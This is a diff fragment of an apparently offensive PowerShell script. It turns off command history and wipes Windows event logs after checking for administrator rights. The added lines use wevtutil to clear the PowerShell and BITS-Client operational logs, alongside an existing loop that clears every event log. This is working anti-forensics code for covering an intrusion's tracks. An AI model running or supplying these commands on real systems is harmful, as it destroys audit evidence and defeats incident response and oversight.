@@ -143,6 +143,8 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
         ## Clear ALL event Logs
         Write-Host "[i] Administrator Privileges: True" -ForegroundColor Yellow
         Write-Host "[+] Cleaning $Env:COMPUTERNAME\$Env:USERNAME Eventvwr logs ...`n" -ForeGroundColor Green
+        wevtutil cl "Microsoft-Windows-Powershell/Operational"  ## Clean Powershell logfiles
+        wevtutil cl "Microsoft-Windows-Bits-Client/Operational" ## Clean BITS-TRANSFER logfiles
         wevtutil el|Foreach-Object {wevtutil cl "$_"}
     }
     Write-Host "";Start-Sleep -Seconds 1
